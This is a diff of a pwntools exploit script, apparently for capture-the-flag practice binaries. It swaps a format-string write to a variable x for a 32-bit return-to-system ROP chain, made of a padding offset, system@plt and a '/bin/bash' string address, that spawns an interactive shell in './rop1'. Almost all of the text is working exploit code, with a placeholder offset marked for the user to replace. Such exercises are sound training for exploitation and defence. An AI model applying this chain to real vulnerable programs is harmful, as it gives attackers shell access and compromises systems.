@@ -1,24 +1,26 @@
 from pwn import *
-binary_path = './pwn/string/fmt-1/fmt1'
+import sys
+elf = ELF('./rop1')
 
-# Load the binary
-elf = ELF(binary_path)
+# Find the offset to overwrite the return address
+offset = cyclic_find(0x6161617f)  # Replace 0x6161617f with the value you get from running the binary and getting an access violation
 
-# Start the process
-p = process(binary_path)
+# Get the address of system and "/bin/bash"
+system_addr = elf.plt['system']
+bash_string_addr = next(elf.search(b'/bin/bash'))
 
-# Find the offset
-fmt = FmtStr(execute_fmt=p.sendline)
-offset = fmt.offset
+# Construct the ROP chain
+rop_chain = p32(system_addr)
+rop_chain += p32(0)  # Return address for system (can be junk since system won't return)
+rop_chain += p32(bash_string_addr)
 
-# Address of the variable `x`
-x_addr = elf.symbols['x']
+# Create the payload
+payload = b'A' * offset
+payload += rop_chain
 
-# Create the payload to overwrite `x` with 4
-payload = fmtstr_payload(offset, {x_addr: 4})
-
-# Send the payload
+# Start the process and send the payload
+p = process('./rop1')
 p.sendline(payload)
 
-# Interact with the shell
+# Pass interaction back to user
 p.interactive()
